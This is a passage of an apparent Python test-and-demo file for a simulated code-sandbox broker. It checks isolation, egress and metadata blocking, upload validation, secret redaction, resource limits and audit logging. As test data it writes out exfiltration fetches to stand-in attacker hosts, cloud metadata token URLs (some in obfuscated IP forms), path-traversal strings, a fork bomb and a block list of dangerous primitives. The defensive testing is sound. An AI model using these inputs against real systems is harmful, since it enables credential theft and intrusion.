    no_role = build_world(grant_role=False)
    error = expect_error(no_role.broker.run_code(U1_SALES, "print hi"), "Forbidden")
    check(error["httpStatus"] == 403, "missing role maps to 403")
    wrong_audience = build_world(audience="https://management.example")
    error = expect_error(wrong_audience.broker.run_code(U1_SALES, "print hi"), "Unauthorized")
    check(error["httpStatus"] == 401, "wrong audience maps to 401")
    other_identity = build_world(principal=OTHER_IDENTITY)
    expect_error(other_identity.broker.run_code(U1_SALES, "print hi"), "Forbidden")
    try:
        no_role.pool.execute(None, ExecuteRequest(identifier="cx-abcd", code="print hi"))
    except Unauthorized:
        pass
    else:
        raise AssertionError("anonymous call must be refused")


def scenario_egress_is_blocked_by_default() -> None:
    w = build_world()
    exfil = w.broker.run_code(U1_SALES, "fetch https://%s/upload?d=pipeline" % EXFIL_HOST)
    check(exfil["status"] == "Failed", "outbound call must fail when egress is disabled")
    check("egress-disabled" in str(exfil["stderr"]), "reason should name the disabled egress")
    attempts = exfil["egressAttempts"]
    check(len(attempts) == 1 and attempts[0]["allowed"] is False, "attempt must be recorded")  # type: ignore[index,arg-type]
    friendly = w.broker.run_code(U1_SALES, "fetch https://%s/rates.csv" % ALLOWED_DATA_HOST)
    check(friendly["status"] == "Failed", "even trusted hosts are blocked when egress is disabled")
    last = w.audit.by_event("execute")[-1]
    check(last.details["egress_denied"] == 1, "audit must count denied egress")
    check("network-call" in exfil["prescreenFindings"], "pre-screen should flag network calls")  # type: ignore[operator]


def scenario_allowlist_permits_only_the_exact_listed_host() -> None:
    egress = EgressPolicy(mode="allowlist", allow_hosts=(ALLOWED_DATA_HOST,))
    w = build_world(egress=egress)
    allowed = w.broker.run_code(U1_SALES, "fetch https://%s/rates.csv" % ALLOWED_DATA_HOST)
    check(allowed["ok"], "the listed host must be reachable")
    cases = (
        ("https://%s/x" % EXFIL_HOST, "host-not-allowlisted"),
        ("https://evil.%s/x" % ALLOWED_DATA_HOST, "host-not-allowlisted"),
        ("https://%s.attacker.example/x" % ALLOWED_DATA_HOST, "host-not-allowlisted"),
        ("http://%s/x" % ALLOWED_DATA_HOST, "scheme-not-allowed"),
        ("https://user@%s/x" % ALLOWED_DATA_HOST, "userinfo-not-allowed"),
    )
    for url, reason in cases:
        ok, why = egress.decide(url)
        check(not ok and why == reason, "%s should be denied as %s, got %s" % (url, reason, why))
    try:
        EgressPolicy(mode="allowlist", allow_hosts=("*.contoso.example",)).validate()
    except InvalidPoolConfiguration:
        pass
    else:
        raise AssertionError("wildcard allowlist entries must be rejected")


def scenario_metadata_and_local_addresses_always_blocked() -> None:
    egress = EgressPolicy(mode="allowlist", allow_hosts=(ALLOWED_DATA_HOST,))
    urls = (
        "http://169.254.169.254/metadata/identity/oauth2/token",
        "http://2852039166/latest",
        "http://0xa9fea9fe/latest",
        "http://168.63.129.16/machine",
        "http://169.254.170.2/creds",
        "http://localhost:8080/",
        "http://127.0.0.1/",
        "http://[::1]/",
    )
    for url in urls:
        ok, why = egress.decide(url)
        check(not ok and why == "metadata-or-local-address", "%s must be blocked, got %s" % (url, why))
    for host in ("169.254.169.254", "metadata", "localhost"):
        try:
            EgressPolicy(mode="allowlist", allow_hosts=(host,)).validate()
        except InvalidPoolConfiguration:
            continue
        raise AssertionError("allowlisting %s must be rejected" % host)
    w = build_world(egress=egress)
    probe = w.broker.run_code(U1_SALES, "fetch http://169.254.169.254/metadata/identity/oauth2/token")
    check(probe["status"] == "Failed", "metadata probe must fail inside the sandbox")
    check("metadata-address" in probe["prescreenFindings"], "pre-screen should flag it")  # type: ignore[operator]


def scenario_upload_path_traversal_is_rejected() -> None:
    w = build_world()
    bad_paths = (
        "../../etc/passwd",
        "/etc/passwd",
        "reports/../../secrets.txt",
        "..\\host.txt",
        "/mnt/data/../../proc/self/environ",
        "%2e%2e/escape.csv",
        "/mnt/database/x.csv",
        "C:/agent/config.json",
        "",
    )
    for path in bad_paths:
        expect_error(w.broker.upload(U1_SALES, path, "text/csv", b"a,b"), "PathRejected")
    expect_error(w.broker.upload(U1_SALES, "tool.sh", "text/x-shellscript", b"echo"), "MimeRejected")
    expect_error(w.broker.upload(U1_SALES, "big.csv", "text/csv", b"x" * 5000), "FileTooLarge")
    check(w.pool.active_session_count() == 0, "rejected uploads must not reach the pool")
    escape = w.broker.run_code(U1_SALES, "write ../../escape.txt hi")
    check(escape["status"] == "Failed" and "PermissionError" in str(escape["stderr"]), "in-sandbox escape blocked")


def scenario_file_round_trip_stays_inside_the_session() -> None:
    w = build_world()
    up = w.broker.upload(U1_SALES, "sales.csv", "text/csv", b"region,revenue\nnorth,120\nsouth,80")
    check(up["ok"] and up["path"] == SANDBOX_DATA_ROOT + "/sales.csv", "upload lands in the data root")
    run = w.broker.run_code(U1_SALES, "read sales.csv\nwrite summary.csv region,total\nemit chart.png image/png 300")
    check(run["ok"], "analysis should succeed")
    summary = w.broker.download(U1_SALES, "summary.csv")
    check(summary["ok"] and summary["content"] == b"region,total", "download returns the written file")
    chart = w.broker.download(U1_SALES, SANDBOX_DATA_ROOT + "/chart.png")
    check(chart["ok"] and chart["mime"] == "image/png", "allowlisted artifact is delivered")
    expect_error(w.broker.download(U2_SALES, "summary.csv"), "FileNotFoundInSession")


def scenario_oversized_output_is_truncated_and_flagged() -> None:
    w = build_world()
    result = w.broker.run_code(U1_SALES, "repeat 60\nprint row-data-row-data-row-data\nend")
    check(result["ok"] and result["stdoutTruncated"], "large output must be flagged")
    stdout = str(result["stdout"])
    check(stdout.endswith(TRUNCATION_MARKER), "truncation marker must be visible to the model")
    limit = w.broker.policy.max_stdout_bytes + len(TRUNCATION_MARKER)
    check(len(stdout.encode("utf-8")) <= limit, "truncated output must respect the cap")
    check(w.audit.by_event("execute")[-1].details["stdout_truncated"] is True, "audit records truncation")


def scenario_secrets_in_output_are_redacted() -> None:
    w = build_world()
    code = "set a Account\nset b Key=\nset c " + "A" * 32 + "\nprint $a$b$c"
    result = w.broker.run_code(U1_SALES, code)
    check(result["ok"], "code itself carries no secret, so it runs")
    check(result["redactions"] == ["storage-account-key"], "output secret must be redacted")
    check("[REDACTED:storage-account-key]" in str(result["stdout"]), "redaction marker present")
    check("A" * 32 not in str(result["stdout"]), "secret value must not reach the model")


def scenario_disallowed_artifact_types_are_quarantined() -> None:
    w = build_world()
    result = w.broker.run_code(
        U1_SALES,
        "emit report.html text/html 200\nemit chart.png image/png 400\nemit dump.csv text/csv 3000",
    )
    check(result["ok"], "emitting artifacts should succeed")
    by_path = {a["path"]: (a["disposition"], a["reason"]) for a in result["artifacts"]}  # type: ignore[union-attr]
    check(by_path[SANDBOX_DATA_ROOT + "/report.html"] == ("quarantine", "mime-not-allowlisted"), "html quarantined")
    check(by_path[SANDBOX_DATA_ROOT + "/chart.png"] == ("deliver", "allowlisted"), "png delivered")
    check(by_path[SANDBOX_DATA_ROOT + "/dump.csv"] == ("quarantine", "too-large"), "oversized csv quarantined")
    fetched = w.broker.download(U1_SALES, "report.html")
    check(fetched["ok"] is False and fetched["quarantined"] is True, "quarantined artifact not delivered")


def scenario_step_budget_terminates_runaway_loop() -> None:
    w = build_world()
    result = w.broker.run_code(U1_SALES, "set n 0\nrepeat forever\nadd n 1\nend")
    check(result["status"] == "BudgetExceeded", "runaway loop must be terminated")
    check("step budget" in str(result["stderr"]), "termination reason must be explicit")
    check(result["stepsUsed"] == ExecutionLimits().step_budget + 1, "terminated at the budget")
    check("unbounded-loop" in result["prescreenFindings"], "pre-screen flags the loop")  # type: ignore[operator]
    after = w.broker.run_code(U1_SALES, "print n=$n")
    check(after["ok"] and not after["sessionIsNew"], "the session survives a terminated execution")


def scenario_process_and_memory_budgets_contain_fork_bomb() -> None:
    w = build_world()
    bomb = w.broker.run_code(U1_SALES, "repeat forever\nspawn 2\nend")
    check(bomb["status"] == "ResourceLimitExceeded" and "process limit" in str(bomb["stderr"]), "fork bomb contained")
    hog = w.broker.run_code(U1_SALES, "repeat 100\nalloc 4\nend")
    check(hog["status"] == "ResourceLimitExceeded" and "memory limit" in str(hog["stderr"]), "memory hog contained")
    check(w.pool.active_session_count() == 1, "blast radius stays inside one session")
    neighbour = w.broker.run_code(U2_SALES, "print still-serving")
    check(neighbour["ok"], "other users keep working")


def scenario_cooldown_expiry_recreates_session_and_surfaces_state_loss() -> None:
    w = build_world()
    cooldown = w.record.spec.cooldown_ticks
    w.broker.upload(U1_SALES, "sales.csv", "text/csv", b"region,revenue\nnorth,120")
    first = w.broker.run_code(U1_SALES, "set basis fy-plan\nread sales.csv")
    check(first["ok"] and first["sessionIsNew"] is False, "upload already created the session")
    w.clock.advance(cooldown - 2)
    warm = w.broker.run_code(U1_SALES, "print basis=$basis")
    check(warm["stdout"] == "basis=fy-plan" and not warm["stateLost"], "activity inside cooldown keeps state")
    w.clock.advance(cooldown + 1)
    after = w.broker.run_code(U1_SALES, "print basis=$basis\nread sales.csv")
    check(after["sessionIsNew"] and after["stateLost"], "expiry must be surfaced as state loss")
    check(after.get("notice") == STATE_LOST_NOTICE, "the model must be told to re-upload or recompute")
    check(after["stdout"] == "basis=", "variables from earlier turns are gone")
    check(after["status"] == "Failed" and "FileNotFoundError" in str(after["stderr"]), "uploaded inputs are gone")
    check(w.pool.expired[-1][1] == "cooldown", "expiry reason recorded as cooldown")
    check(w.audit.by_event("execute")[-1].details["state_lost"] is True, "audit records the state loss")
    w.clock.advance(cooldown + 1)
    missing = w.broker.download(U1_SALES, "summary.csv")
    expect_error(missing, "FileNotFoundInSession")
    check(missing["stateLost"] is True, "a download after expiry also surfaces state loss")


def scenario_max_lifetime_expiry_and_explicit_delete() -> None:
    w = build_world()
    spec = w.record.spec
    w.broker.run_code(U1_SALES, "set k kept")
    results = []
    for _ in range(spec.max_lifetime_ticks // spec.cooldown_ticks):
        w.clock.advance(spec.cooldown_ticks)
        results.append(w.broker.run_code(U1_SALES, "print k=$k"))
    check(all(r["stdout"] == "k=kept" for r in results[:-1]), "steady activity keeps the session alive")
    check(results[-1]["sessionIsNew"] and results[-1]["stateLost"], "max lifetime recycles even busy sessions")
    check(w.pool.expired[-1][1] == "max-lifetime", "expiry reason recorded as max-lifetime")
    identifier = w.broker.session_identifier_for(U1_SALES)
    ended = w.broker.end_conversation(U1_SALES)
    check(ended["ok"] and ended["deleted"] is True, "explicit delete at conversation end")
    check(not w.pool.has_session(identifier), "the session is gone after delete")
    again = w.broker.end_conversation(U1_SALES)
    check(again["ok"] and again["deleted"] is False, "delete is idempotent")
    outcomes = [record.outcome for record in w.audit.by_event("delete")]
    check(outcomes == ["Deleted", "NotFound"], "both deletes are audited")
    fresh = w.broker.run_code(U1_SALES, "print k=$k")
    check(fresh["sessionIsNew"] and not fresh["stateLost"], "a deliberate end is not reported as loss")


def scenario_capacity_exhaustion_fails_fast_then_recovers() -> None:
    w = build_world(max_sessions=2)
    check(w.broker.run_code(U1_SALES, "print a")["ok"], "first session fits")
    check(w.broker.run_code(U2_SALES, "print b")["ok"], "second session fits")
    error = expect_error(w.broker.run_code(U3_SALES, "print c"), "CapacityExceeded")
    check(error["retryable"] is True and error["httpStatus"] == 429, "capacity errors are retryable")
    check(w.pool.created_count == 2, "no session created beyond capacity")
    again = w.broker.run_code(U1_SALES, "print a-again")
    check(again["ok"] and not again["sessionIsNew"], "existing sessions keep working when full")
    w.broker.end_conversation(U2_SALES)
    retried = w.broker.run_code(U3_SALES, "print c")
    check(retried["ok"] and retried["sessionIsNew"], "ending a conversation frees a slot")
    idle = build_world(max_sessions=1)
    idle.broker.run_code(U1_SALES, "print a")
    expect_error(idle.broker.run_code(U2_SALES, "print b"), "CapacityExceeded")
    idle.clock.advance(idle.record.spec.cooldown_ticks + 1)
    check(idle.broker.run_code(U2_SALES, "print b")["ok"], "an idle slot frees only after cooldown")


def scenario_unpinned_identifiers_mint_a_session_per_call() -> None:
    w = build_world(max_sessions=3)
    token = w.tokens.get_token(SESSIONS_TOKEN_SCOPE)
    outcomes: List[object] = []
    for n in range(4):
        request = ExecuteRequest(identifier="req-%04d" % n, code="add x 1\nprint x=$x")
        try:
            response = w.pool.execute(token, request)
            outcomes.append((response.session_is_new, response.stdout))
        except CapacityExceeded:
            outcomes.append("capacity")
    expected = [(True, "x=1"), (True, "x=1"), (True, "x=1"), "capacity"]
    check(outcomes == expected, "unpinned identifiers lose state and burn capacity: %r" % outcomes)
    pinned = build_world(max_sessions=3)
    for _ in range(4):
        last = pinned.broker.run_code(U1_SALES, "add x 1\nprint x=$x")
    check(last["stdout"] == "x=4", "a pinned identifier keeps state across calls")
    check(pinned.pool.created_count == 1, "a pinned identifier uses one slot")


def scenario_custom_packages_select_custom_pool_and_mcp_is_rejected() -> None:
    types = FakeResourceProvider("region-a").discover_pool_types()
    decision = select_pool(WorkloadNeeds(packages=frozenset({"pandas", "polars"})), types)
    check(decision.pool_type == "CustomContainer", "packages outside the built-in image need a custom pool")
    check(decision.access_path == "direct-data-plane", "no MCP needed, so call the data plane")
    check(any("polars" in reason for reason in decision.reasons), "the decision explains why")
    w = build_world(pool_type="CustomContainer", mcp_enabled=True, name="pool-contoso-custom")
    check(w.provider.readback_drift("pool-contoso-custom") == ["mcpEnabled"], "read-back reveals the dropped MCP flag")
    check(any("silently dropped" in warning for warning in w.record.warnings), "the drop is surfaced as a warning")
    error = expect_error(w.broker.mcp_tool_descriptor(U1_SALES), "McpNotAvailable")
    check(error["httpStatus"] == 409, "MCP on a custom pool is a clear conflict, not a silent failure")
    run = w.broker.run_code(U1_SALES, "import polars\nprint polars-ok")
    check(run["ok"] and run["stdout"] == "polars-ok", "the custom image provides the package")


def scenario_mcp_need_selects_builtin_pool() -> None:
    types = FakeResourceProvider("region-a").discover_pool_types()
    decision = select_pool(WorkloadNeeds(needs_mcp=True, packages=frozenset({"pandas"})), types)
    check(decision.pool_type == "PythonLTS", "MCP need with built-in packages selects the built-in pool")
    check(decision.access_path == "aca-built-in-mcp", "and uses the built-in MCP endpoint")
    check(any("secret" in warning for warning in decision.warnings), "the MCP key must be treated as a secret")
    w = build_world(mcp_enabled=True)
    check(w.provider.readback_drift(w.record.spec.name) == [], "read-back matches the request")
    descriptor = w.broker.mcp_tool_descriptor(U1_SALES)
    check(descriptor["ok"] and descriptor["modelMaySetIdentifier"] is False, "the model never sets the identifier")
    check(
        descriptor["pinnedSessionIdentifier"] == w.broker.session_identifier_for(U1_SALES),
        "the app pins the per-conversation identifier",
    )
    check(str(descriptor["server_url"]).startswith(POOL_MANAGEMENT_ENDPOINT), "endpoint comes from the pool")
    check("Key Vault" in str(descriptor["connectionCredential"]), "credential is a reference, not a value")
    missing = w.broker.run_code(U1_SALES, "import polars")
    check(missing["status"] == "Failed" and "ModuleNotFoundError" in str(missing["stderr"]), "gap is visible")


def scenario_packages_plus_mcp_need_own_tool_front() -> None:
    types = FakeResourceProvider("region-a").discover_pool_types()
    decision = select_pool(WorkloadNeeds(needs_mcp=True, packages=frozenset({"pyarrow"})), types)
    check(decision.pool_type == "CustomContainer", "custom packages force the custom pool")
    check(decision.access_path == "own-mcp-or-openapi-front", "MCP must come from your own front")
    check(any("pins the session identifier" in warning for warning in decision.warnings), "front pins the id")
    script = select_pool(WorkloadNeeds(language="javascript", needs_mcp=True), types)
    check(script.pool_type == "NodeLTS" and script.access_path == "own-mcp-or-openapi-front", "same for other languages")
    plain = select_pool(WorkloadNeeds(), types)
    check(plain.pool_type == "PythonLTS" and plain.access_path == "direct-data-plane", "default is the built-in pool")


def scenario_warm_setting_ignored_on_managed_pool_and_zero_rejected_on_custom() -> None:
    provider = FakeResourceProvider("region-a")
    managed = provider.create_pool(PoolSpec(name="pool-managed", pool_type="PythonLTS", ready_session_instances=2))
    check(managed.effective_ready_instances is None, "managed pools do not store the warm setting")
    check(provider.readback_drift("pool-managed") == ["readySessionInstances"], "read-back shows the drift")
    check(any("not honoured" in warning for warning in managed.warnings), "the drift is explained")
    try:
        provider.create_pool(
            PoolSpec(
                name="pool-custom-zero",
                pool_type="CustomContainer",
                ready_session_instances=0,
                image_packages=CUSTOM_IMAGE_PACKAGES,
            )
        )
    except InvalidPoolConfiguration as err:
        check("billable" in err.message, "the rejection explains the always-warm cost")
    else:
        raise AssertionError("custom pool with zero ready instances must be rejected")
    custom = provider.create_pool(
        PoolSpec(
            name="pool-custom",
            pool_type="CustomContainer",
            ready_session_instances=1,
            image_packages=CUSTOM_IMAGE_PACKAGES,
            image_runs_as_non_root=True,
        )
    )
    check(custom.effective_ready_instances == 1, "custom pools honour the warm setting")
    check(any("non-root USER" in warning for warning in custom.warnings), "non-root image trap is flagged")


def scenario_pool_types_come_from_the_resource_provider() -> None:
    region_a = FakeResourceProvider("region-a").discover_pool_types()
    region_b = FakeResourceProvider("region-b").discover_pool_types()
    check("NodeLTS" in region_a and "NodeLTS" not in region_b, "pool types differ by region")
    check(select_pool(WorkloadNeeds(language="javascript"), region_a).pool_type == "NodeLTS", "region-a works")
    try:
        select_pool(WorkloadNeeds(language="javascript"), region_b)
    except InvalidPoolType as err:
        check(err.details["valid_types"] == list(region_b), "the error lists what the region offers")
    else:
        raise AssertionError("selecting an unavailable pool type must fail")
    try:
        FakeResourceProvider("region-b").create_pool(PoolSpec(name="pool-shell", pool_type="Shell", region="region-b"))
    except InvalidPoolType as err:
        check("PythonLTS" in err.details["valid_types"], "the provider answers with the valid list")  # type: ignore[operator]
    else:
        raise AssertionError("creating an unavailable pool type must fail")


def scenario_in_process_execution_is_refused() -> None:
    try:
        SandboxBroker(
            InProcessExecutor(),
            StaticTokenProvider(BROKER_IDENTITY),
            StaticDerivationKeyProvider(DEMO_DERIVATION_KEY),
            AuditLog(),
            InMemoryApprovalGate(),
        )
    except InProcessExecutionRefused as err:
        check(err.details["isolation_boundary"] == "none", "the refusal names the missing boundary")
    else:
        raise AssertionError("broker must refuse an in-process backend")
    try:
        InProcessExecutor().execute(None, ExecuteRequest(identifier="cx-abcd", code="print hi"))
    except InProcessExecutionRefused:
        pass
    else:
        raise AssertionError("in-process executor must refuse even when called directly")
    code = "getenv IDENTITY_ENDPOINT\nfetch https://%s/x\nwrite out.csv a" % EXFIL_HOST
    exposure = in_process_exposure(code, SIMULATED_AGENT_HOST_ENV)
    check(exposure["executed"] is False, "exposure analysis never runs the code")
    check(exposure["wouldMintIdentityTokens"] is True, "in-process code could mint the agent's tokens")
    check(EXFIL_HOST in exposure["wouldReachHosts"], "in-process code would share network line-of-sight")  # type: ignore[operator]
    check(exposure["wouldWriteAgentFilesystem"] and exposure["wouldShareAgentMemory"], "and the filesystem and memory")


def scenario_secrets_in_code_are_flagged_before_execution() -> None:
    w = build_world()
    leaked = "set conn DefaultEndpointsProtocol=https;" + "Account" + "Key=" + "Q" * 40
    error = expect_error(w.broker.run_code(U1_SALES, leaked), "SecretInCode")
    check("storage-account-key" in error["details"]["patterns"], "the pattern is named")  # type: ignore[index,operator]
    assigned = "set cfg " + "client_" + "secret=" + "s" * 12
    error = expect_error(w.broker.run_code(U1_SALES, assigned), "SecretInCode")
    check("assigned-credential" in error["details"]["patterns"], "assigned credentials are caught")  # type: ignore[index,operator]
    check(w.pool.active_session_count() == 0, "flagged code never reaches the pool")
    dump = w.audit.as_json()
    check("Q" * 40 not in dump and "s" * 12 not in dump, "the secret value is not copied into audit")
    check(all(r.outcome == "SecretInCode" for r in w.audit.by_event("execute")), "rejections are audited")


def scenario_oversized_code_is_rejected_before_execution() -> None:
    w = build_world()
    big = "print " + "x" * (w.broker.policy.max_code_bytes + 1)
    error = expect_error(w.broker.run_code(U1_SALES, big), "CodeTooLarge")
    check(error["httpStatus"] == 413, "oversized code maps to 413")
    check(w.pool.created_count == 0, "oversized code never reaches the pool")
    tight = build_world(policy=BrokerPolicy(max_code_bytes=64))
    expect_error(tight.broker.run_code(U1_SALES, "print " + "y" * 64), "CodeTooLarge")
    check(tight.broker.run_code(U1_SALES, "print small")["ok"], "code under the limit runs")


def scenario_sandbox_has_no_agent_credentials() -> None:
    w = build_world()
    names = ("IDENTITY_ENDPOINT", "IDENTITY_HEADER", "PROJECT_ENDPOINT")
    result = w.broker.run_code(U1_SALES, "\n".join("getenv %s" % name for name in names))
    check(result["ok"], "reading the environment is allowed; it is just empty of secrets")
    for name in names:
        check("%s=<unset>" % name in str(result["stdout"]), "%s must not exist in the session" % name)
    env = w.pool.peek_env(w.broker.session_identifier_for(U1_SALES))
    for name in SIMULATED_AGENT_HOST_ENV:
        check(name not in env, "agent host variable %s leaked into the session" % name)
    check("environment-read" in result["prescreenFindings"], "environment reads are logged")  # type: ignore[operator]
    check(set(w.tokens.requested_scopes) == {SESSIONS_TOKEN_SCOPE}, "broker only requests the sessions scope")


def scenario_side_effecting_output_goes_to_approval() -> None:
    w = build_world()
    code = "set n 3\nprint flagged=$n\npropose update_credit_limit account=northwind-traders change=raise"
    result = w.broker.run_code(U1_SALES, code)
    check(result["ok"] and len(result["pendingApprovals"]) == 1, "proposal becomes an approval ticket")  # type: ignore[arg-type]
    pending = w.approvals.pending()
    check(len(pending) == 1 and pending[0]["status"] == "pending", "nothing is applied automatically")
    proposal = pending[0]["proposal"]
    check(proposal["action"] == "update_credit_limit", "the action is preserved for the reviewer")  # type: ignore[index]
    check(proposal["source"] == "sandbox-output", "the reviewer sees it came from generated code")  # type: ignore[index]
    check(proposal["correlationId"] == result["correlationId"], "ticket correlates to the execution")  # type: ignore[index]
    check(w.audit.by_event("execute")[-1].details["pending_approvals"] == 1, "audit counts pending approvals")
    check("side-effect-proposal" in result["prescreenFindings"], "pre-screen flags the proposal")  # type: ignore[operator]
    check(not hasattr(w.approvals, "apply"), "the sandbox side has no path to apply a proposal")


def scenario_audit_records_have_correlation_ids_and_no_code_bodies() -> None:
    w = build_world()
    marker = "confidential-margin-model-v7"
    code = "set plan %s\nprint done" % marker
    w.broker.upload(U1_SALES, "in.csv", "text/csv", b"a,b")
    run = w.broker.run_code(U1_SALES, code)
    w.broker.download(U1_SALES, "in.csv")
    w.broker.end_conversation(U1_SALES)
    dump = w.audit.as_json()
    check(marker not in dump, "code bodies never appear in audit")
    for raw in (TENANT_CONTOSO, USER_A, CONV_SALES, w.broker.session_identifier_for(U1_SALES)):
        check(raw not in dump, "raw identity value %r must be hashed in audit" % raw)
    check([r.event for r in w.audit.records] == ["upload", "execute", "download", "delete"], "every call audited")
    correlation_ids = [r.correlation_id for r in w.audit.records]
    check(len(set(correlation_ids)) == 4, "each call has its own correlation id")
    check(all(c.startswith("corr-") for c in correlation_ids), "correlation id format")
    execute = w.audit.by_event("execute")[0]
    check(execute.correlation_id == run["correlationId"], "result and audit share the correlation id")
    check(execute.details["code_sha256"] == hashlib.sha256(code.encode("utf-8")).hexdigest(), "code is hashed")
    inbound = w.broker.run_code(U1_SALES, "print again", correlation_id="corr-from-gateway-0001")
    check(inbound["correlationId"] == "corr-from-gateway-0001", "an upstream correlation id is honoured")
    check(w.audit.records[-1].correlation_id == "corr-from-gateway-0001", "and carried into audit")


def scenario_answer_without_execution_evidence_fails_eval() -> None:
    w = build_world()
    run = w.broker.run_code(U1_SALES, "set total 120\nadd total 80\nprint total_revenue=$total")
    trace = [{"type": "code_execution", "status": run["status"], "stdout": run["stdout"]}]
    ok, _ = evaluate_answer("Total revenue is 200.", trace)
    check(ok, "a number backed by execution output passes")
    ok, why = evaluate_answer("Total revenue is 210.", trace)
    check(not ok and "210" in why, "a number not in the output fails")
    ok, why = evaluate_answer("Total revenue is 200.", [])
    check(not ok and "no succeeded" in why, "no execution means no evidence")
    failed = w.broker.run_code(U1_SALES, "print total=$total\nread missing.csv")
    failed_trace = [{"type": "code_execution", "status": failed["status"], "stdout": failed["stdout"]}]
    ok, _ = evaluate_answer("Total is 200.", failed_trace)
    check(not ok, "a failed execution is not evidence even if it printed the number")


def scenario_live_adapter_stays_gated() -> None:
    saved = os.environ.pop(LIVE_ENV_VAR, None)
    try:
        try:
            AcaSessionPoolAdapter()
        except LiveAdapterGated as err:
            check(LIVE_ENV_VAR in str(err), "the gate names the opt-in variable")
        else:
            raise AssertionError("live adapter must not construct without the opt-in flag")
        os.environ[LIVE_ENV_VAR] = "1"
        adapter = AcaSessionPoolAdapter()
        check(adapter.isolation_boundary == "remote-sandbox", "a real pool is an acceptable boundary")
        broker = SandboxBroker(
            adapter,
            StaticTokenProvider(BROKER_IDENTITY),
            StaticDerivationKeyProvider(DEMO_DERIVATION_KEY),
            AuditLog(),
            InMemoryApprovalGate(),
        )
        try:
            broker.run_code(U1_SALES, "print hi")
        except NotImplementedError as err:
            check("verify" in str(err), "the stub points at current documentation")
        else:
            raise AssertionError("the stub must not pretend to execute")
        wire = ExecuteRequest(identifier="cx-abcd", code="print hi").to_wire()
        check(API_VERSION_PLACEHOLDER in str(wire["url"]), "wire shape keeps the api-version placeholder")
        check("identifier=cx-abcd" in str(wire["url"]), "identifier travels as a query parameter")
    finally:
        if saved is None:
            os.environ.pop(LIVE_ENV_VAR, None)
        else:
            os.environ[LIVE_ENV_VAR] = saved


def scenario_simulator_never_executes_submitted_code_on_host() -> None:
    forbidden_calls = {"exec", "eval", "compile", "__import__", "breakpoint"}
    forbidden_attrs = {"system", "popen", "fork", "forkpty", "execv", "execve", "execvp", "execl", "spawnv", "urlopen"}
    forbidden_roots = {"socket", "http", "subprocess", "requests", "ctypes", "asyncio", "multiprocessing", "pickle"}
    forbidden_modules = {"urllib.request"}
    with open(__file__, "r", encoding="utf-8") as handle:
        source = handle.read()
    check(source.isascii(), "simulator source must be ASCII only")
    problems: List[str] = []
    for node in ast.walk(ast.parse(source)):
        if isinstance(node, ast.Call):
            func = node.func
            if isinstance(func, ast.Name) and func.id in forbidden_calls:
                problems.append("call to %s at line %d" % (func.id, node.lineno))
            if isinstance(func, ast.Attribute) and func.attr in forbidden_attrs:
                problems.append("call to .%s at line %d" % (func.attr, node.lineno))
        elif isinstance(node, ast.Import):
            for alias in node.names:
                if alias.name.split(".")[0] in forbidden_roots or alias.name in forbidden_modules:
                    problems.append("import of %s at line %d" % (alias.name, node.lineno))
        elif isinstance(node, ast.ImportFrom):
            module = node.module or ""
            if module.split(".")[0] in forbidden_roots or module in forbidden_modules:
                problems.append("import from %s at line %d" % (module, node.lineno))
    check(not problems, "host execution or network primitives found: %s" % "; ".join(problems))


SCENARIOS: List[Tuple[str, Callable[[], None]]] = [
    (name[len("scenario_"):], fn)
    for name, fn in list(globals().items())
    if name.startswith("scenario_") and callable(fn)
]


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def run_self_test() -> int:
    failures = 0
    for name, fn in SCENARIOS:
        try:
            fn()
        except Exception as err:  # noqa: BLE001 - report every scenario, never stop early
            failures += 1
            print("FAIL %s: %s: %s" % (name, type(err).__name__, err))
        else:
            print("PASS %s" % name)
    passed = len(SCENARIOS) - failures
    print("%d/%d scenarios passed" % (passed, len(SCENARIOS)))
    return 0 if failures == 0 else 1


def _show(title: str, payload: object) -> None:
    print("")
    print("== %s" % title)
    print(json.dumps(payload, indent=2, sort_keys=True, default=str))


def _pick(result: Dict[str, object], *keys: str) -> Dict[str, object]:
    return {key: result[key] for key in keys if key in result}


def run_demo() -> int:
    print("Code-execution sandbox with session pools - simulated walkthrough")
    print("Fictional world: Contoso and Fabrikam tenants, no network, no real pool.")
    print("Submitted code is interpreted by a tiny deterministic toy language; it never runs on this host.")

    types = FakeResourceProvider("region-a").discover_pool_types()
    _show("1. Ask the resource provider which pool types exist", {"region-a": list(types)})
    for label, needs in (
        ("plain analysis", WorkloadNeeds()),
        ("needs MCP", WorkloadNeeds(needs_mcp=True)),
        ("needs polars", WorkloadNeeds(packages=frozenset({"polars"}))),
        ("needs polars and MCP", WorkloadNeeds(needs_mcp=True, packages=frozenset({"polars"}))),
    ):
        decision = select_pool(needs, types)
        _show(
            "2. Pool selection: %s" % label,
            {"poolType": decision.pool_type, "accessPath": decision.access_path, "warnings": decision.warnings},
        )

    w = build_world()
    identifier = w.broker.session_identifier_for(U1_SALES)
    _show(
        "3. Session identifier derived from tenant, user and conversation",
        {"identifier": identifier, "length": len(identifier), "clientMaySupplyIt": False},
    )

    w.broker.upload(U1_SALES, "sales.csv", "text/csv", b"region,revenue\nnorth,120\nsouth,80")
    first = w.broker.run_code(U1_SALES, "set total 120\nadd total 80\nprint total_revenue=$total")
    second = w.broker.run_code(U1_SALES, "mul total 2\nprint doubled=$total")
    _show("4. Same user and conversation reuse one session", {
        "first": _pick(first, "status", "stdout", "sessionIsNew"),
        "second": _pick(second, "status", "stdout", "sessionIsNew"),
    })

    other = w.broker.run_code(U2_SALES, "print total=$total")
    _show("5. A different user never sees that state", _pick(other, "status", "stdout", "sessionIsNew"))

    exfil = w.broker.run_code(U1_SALES, "fetch https://%s/upload" % EXFIL_HOST)
    imds = w.broker.run_code(U1_SALES, "fetch http://169.254.169.254/metadata/identity")
    _show("6. Egress is off by default, metadata addresses always blocked", {
        "exfiltration": _pick(exfil, "status", "stderr", "egressAttempts"),
        "metadata": _pick(imds, "status", "stderr", "egressAttempts"),
    })

    traversal = w.broker.upload(U1_SALES, "../../etc/passwd", "text/plain", b"x")
    _show("7. Upload path traversal is rejected", traversal)

    noisy = w.broker.run_code(U1_SALES, "repeat 200\nprint row-of-output\nend")
    _show("8. Oversized output is truncated and flagged", {
        "stdoutTruncated": noisy.get("stdoutTruncated"),
        "stdoutBytes": len(str(noisy.get("stdout", ""))),
    })

    runaway = w.broker.run_code(U1_SALES, "repeat forever\nadd n 1\nend")
    _show("9. A runaway loop hits the step budget", _pick(runaway, "status", "stderr", "stepsUsed"))

    w.clock.advance(w.record.spec.cooldown_ticks + 1)
    expired = w.broker.run_code(U1_SALES, "print total=$total")
